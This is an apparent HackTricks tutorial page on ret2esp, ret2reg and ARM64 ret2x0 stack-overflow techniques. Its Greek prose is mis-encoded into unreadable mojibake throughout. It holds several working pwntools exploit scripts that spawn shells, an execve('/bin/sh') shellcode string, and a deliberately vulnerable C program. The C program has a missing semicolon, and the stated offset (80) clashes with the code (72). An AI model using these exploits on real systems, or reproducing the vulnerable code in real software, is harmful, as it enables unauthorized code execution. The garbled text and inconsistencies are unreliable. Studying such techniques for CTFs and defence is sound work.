# Ret2esp / Ret2reg

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## **Ret2esp**

**Î•Ï€ÎµÎ¹Î´Î® Ï„Î¿ ESP (Î”ÎµÎ¯ÎºÏ„Î·Ï‚ Î£Ï„Î¿Î¯Î²Î±Ï‚) Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï€Î¬Î½Ï„Î± ÏƒÏ„Î·Î½ ÎºÎ¿ÏÏ…Ï†Î® Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚**, Î±Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… EIP (Î”ÎµÎ¯ÎºÏ„Î·Ï‚ Î•Î½Ï„Î¿Î»ÏÎ½) Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î¹Î±Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ **`jmp esp`** Î® **`call esp`**. ÎœÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿, Ï„Î¿ shellcode Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ Î±ÎºÏÎ¹Î²ÏÏ‚ Î¼ÎµÏ„Î¬ Ï„Î¿Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸Î­Î½Ï„Î± EIP. ÎŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î· ÎµÎ½Ï„Î¿Î»Î® `ret`, Ï„Î¿ ESP Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, Î±ÎºÏÎ¹Î²ÏÏ‚ ÎµÎºÎµÎ¯ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿ Ï„Î¿ shellcode.

Î‘Î½ **Î· Ï„Ï…Ï‡Î±Î¹Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… Î§ÏÏÎ¿Ï… Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ (ASLR)** Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÎµ Windows Î® Linux, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î¿Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ `jmp esp` Î® `call esp` Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÎµ ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Îµ Ï„Î¿ [**ASLR**](../common-binary-protections-and-bypasses/aslr/) ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î±Ï…Ï„Î­Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î¯Î´Î¹Î¿ (ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î¾ÎµÏ€ÎµÏÎ¬ÏƒÎµÏ„Îµ Ï„Î¿ [**PIE**](../common-binary-protections-and-bypasses/pie/)).

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… shellcode **Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î´Î¹Î±Ï†Î¸Î¿ÏÎ¬ Ï„Î¿Ï… EIP**, Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î· Î¼Î­ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚, ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚ `push` Î® `pop` ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Ï„Î¬ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î´ÎµÎ½ ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Ï…Î½ Ï„Î¿ shellcode. Î‘Ï…Ï„Î® Î· Ï€Î±ÏÎµÎ¼Î²Î¿Î»Î® Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ…Î¼Î²ÎµÎ¯ Î±Î½ Ï„Î¿ shellcode Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î½ ÏƒÏ„Î· Î¼Î­ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚.

### ÎˆÎ»Î»ÎµÎ¹ÏˆÎ· Ï‡ÏÏÎ¿Ï…

Î‘Î½ ÏƒÎ±Ï‚ Î»ÎµÎ¯Ï€ÎµÎ¹ Ï‡ÏÏÎ¿Ï‚ Î³Î¹Î± ÎµÎ³Î³ÏÎ±Ï†Î® Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… RIP (Î¯ÏƒÏ‰Ï‚ Î¼ÏŒÎ½Î¿ Î»Î¯Î³Î± bytes), Î³ÏÎ¬ÏˆÏ„Îµ Î­Î½Î± Î±ÏÏ‡Î¹ÎºÏŒ **`jmp`** shellcode ÏŒÏ€Ï‰Ï‚:
```armasm
sub rsp, 0x30
jmp rsp
```
ÎšÎ±Î¹ Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿ shellcode ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Ï„Î¿Ï… stack.

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿ [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) Î¼Îµ Î­Î½Î± Ï„ÎµÎ»Î¹ÎºÏŒ exploit ÏŒÏ€Ï‰Ï‚:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Î­Î½Î± Î¬Î»Î»Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¿ [https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html). Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ¼Î± buffer Ï‡Ï‰ÏÎ¯Ï‚ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Ï„Î¿ NX, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± gadget Î³Î¹Î± Î½Î± **Î¼ÎµÎ¹ÏÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… `$esp`** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î­Î½Î± `jmp esp;` Î³Î¹Î± Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯ ÏƒÏ„Î¿ shellcode:
```python
# From https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html
from pwn import *

# Establish the target process
target = process('./b0verflow')
#gdb.attach(target, gdbscript = 'b *0x080485a0')

# The shellcode we will use
# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Establish our rop gadgets

# 0x08048504 : jmp esp
jmpEsp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

# Make the payload

payload = ""
payload += jmpEsp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += "1"*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

# Send our payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```
## Ret2reg

Î•Ï€Î¯ÏƒÎ·Ï‚, Î±Î½ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Ï„Î¿ shellcode, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Ï„Î¹Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ **`call eax`** Î® **`jmp eax`** (Î³Î½Ï‰ÏƒÏ„Î® Ï‰Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ® **ret2eax**), Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Î½Ï„Î±Ï‚ Î¬Î»Î»Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… shellcode Î¼Î±Ï‚. ÎŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ Î¼Îµ Ï„Î¿ eax, **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ register** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ (**ret2reg**).

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÎ´Ï:&#x20;

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)
* [https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c)
* Î— **`strcpy`** Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ ÏƒÏ„Î¿ **`eax`** Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… buffer ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÏ„Î·ÎºÎµ Ï„Î¿ shellcode ÎºÎ±Î¹ Ï„Î¿ **`eax`** Î´ÎµÎ½ Î±Î½Ï„Î¹ÎºÎ±Î¸Î¯ÏƒÏ„Î±Ï„Î±Î¹, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ `ret2eax`.

## ARM64

### Ret2sp

Î£Ï„Î¿ ARM64 Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¿Î´Î·Î³Î¯ÎµÏ‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î· **Î¼ÎµÏ„Î¬Î²Î±ÏƒÎ· ÏƒÏ„Î¿ Î¼Î·Ï„ÏÏÎ¿ SP**. ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Î­Î½Î± gadget Ï€Î¿Ï… **Î¼ÎµÏ„Î±ÎºÎ¹Î½ÎµÎ¯ Ï„Î¿ sp ÏƒÎµ Î­Î½Î± Î¼Î·Ï„ÏÏÎ¿ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¼ÎµÏ„Î±Î²Î±Î¯Î½ÎµÎ¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î·Ï„ÏÏÎ¿**, Î±Î»Î»Î¬ ÏƒÏ„Î·Î½ libc Ï„Î¿Ï… Kali Î¼Î¿Ï… Î´ÎµÎ½ Î¼Ï€ÏŒÏÎµÏƒÎ± Î½Î± Î²ÏÏ‰ ÎºÎ¬Ï€Î¿Î¹Î¿ gadget ÏƒÎ±Î½ Î±Ï…Ï„ÏŒ:
```bash
for i in `seq 1 30`; do
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei "[mov|add] x${i}, sp.* ; b[a-z]* x${i}( |$)";
done
```
{% endcode %}

Î¤Î± Î¼ÏŒÎ½Î± Ï€Î¿Ï… Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ± Î¸Î± Î¬Î»Î»Î±Î¶Î±Î½ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… Î¼Î·Ï„ÏÏÎ¿Ï… ÏŒÏ€Î¿Ï… Î±Î½Ï„Î¹Î³ÏÎ¬Ï†Ï„Î·ÎºÎµ Ï„Î¿ sp Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î±Î»Î»Î±Î³Î® ÏƒÎµ Î±Ï…Ï„ÏŒ (Î­Ï„ÏƒÎ¹ Î¸Î± Î­Î³Î¹Î½Îµ Î¬Ï‡ÏÎ·ÏƒÏ„Î¿):

<figure><img src="../../.gitbook/assets/image (1221).png" alt=""><figcaption></figcaption></figure>

### Ret2reg

Î‘Î½ Î­Î½Î± Î¼Î·Ï„ÏÏÎ¿ Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÏƒÎµ Î±Ï…Ï„Î®Î½ Î±Ï€Î»Î¬ Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÎ½Ï„Î¿Î»Î®. Î˜Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½:
```bash
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei " b[a-z]* x[0-9][0-9]?";
```
{% endcode %}

Î£Ï„Î¿ ARM64, ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **`x0`** Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î·Î½ Ï„Î¹Î¼Î® ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Î¼Î¹Î±Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚, Î¿Ï€ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î¼Î²ÎµÎ¯ Î½Î± Ï„Î¿ x0 Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÎ½ÏŒÏ‚ buffer Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Î­Î½Î± shellcode Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·. 

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎºÏÎ´Î¹ÎºÎ±:
```c
// clang -o ret2x0 ret2x0.c -no-pie -fno-stack-protector -Wno-format-security -z execstack

#include <stdio.h>
#include <string.h>

void do_stuff(int do_arg){
if (do_arg == 1)
__asm__("br x0");
return;
}

char* vulnerable_function() {
char buffer[64];
fgets(buffer, sizeof(buffer)*3, stdin);
return buffer;
}

int main(int argc, char **argv) {
char* b = vulnerable_function();
do_stuff(2)
return 0;
}
```
Î•Î»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ ÏŒÏ„Î¹ Î· **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… buffer** (ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ bof ÎºÎ±Î¹ **ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·**) ÎµÎ¯Î½Î±Î¹ **Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î· ÏƒÏ„Î¿ `x0`** Ï€ÏÎ¹Î½ ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î¼Îµ Î±Ï€ÏŒ Ï„Î·Î½ Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ· Ï„Î¿Ï… buffer:

<figure><img src="../../.gitbook/assets/image (1222).png" alt="" width="563"><figcaption></figcaption></figure>

Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Ï„Î¿ gadget **`br x0`** ÏƒÏ„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **`do_stuff`**:

<figure><img src="../../.gitbook/assets/image (1223).png" alt="" width="563"><figcaption></figcaption></figure>

Î˜Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ gadget Î³Î¹Î± Î½Î± Î¼ÎµÏ„Î±Î²Î¿ÏÎ¼Îµ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎµÎ¯Î½Î±Î¹ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÎ¼Î­Î½Î¿ **Î§Î©Î¡Î™Î£ PIE.** Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¿ÏÎ¼Îµ ÏŒÏ„Î¹ Ï„Î¿ **offset Ï„Î·Ï‚ Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ·Ï‚ Ï„Î¿Ï… buffer ÎµÎ¯Î½Î±Î¹ 80**, Î­Ï„ÏƒÎ¹ Ï„Î¿ exploit Î¸Î± ÎµÎ¯Î½Î±Î¹:
```python
from pwn import *

p = process('./ret2x0')
elf = context.binary = ELF('./ret2x0')

stack_offset = 72
shellcode = asm(shellcraft.sh())
br_x0 = p64(0x4006a0) # Addr of: br x0;
payload = shellcode + b"A" * (stack_offset - len(shellcode)) + br_x0

p.sendline(payload)
p.interactive()
```
{% hint style="warning" %}
Î‘Î½ Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ `fgets` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î½ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ Ï„Î¿ **`read`**, Î¸Î± Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï€Î±ÏÎ±ÎºÎ±Î¼Ï†Î¸ÎµÎ¯ Ï„Î¿ PIE Î±Ï€Î»Î¬ Î¼Îµ Ï„Î¿ **Ï…Ï€ÎµÏÎµÎ³Î³ÏÎ±Ï†Î® Ï„Ï‰Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Ï‰Î½ 2 bytes Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚** Î³Î¹Î± Î½Î± Î³Î¯Î½ÎµÎ¹ ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î® ÏƒÏ„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `br x0;` Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î³Î¹Î± Ï„Î·Î½ Ï€Î»Î®ÏÎ· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·.\
ÎœÎµ Ï„Î¿ `fgets` Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎµÏ€ÎµÎ¹Î´Î® **Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Î­Î½Î± null (0x00) byte ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚**.
{% endhint %}

## Î ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚

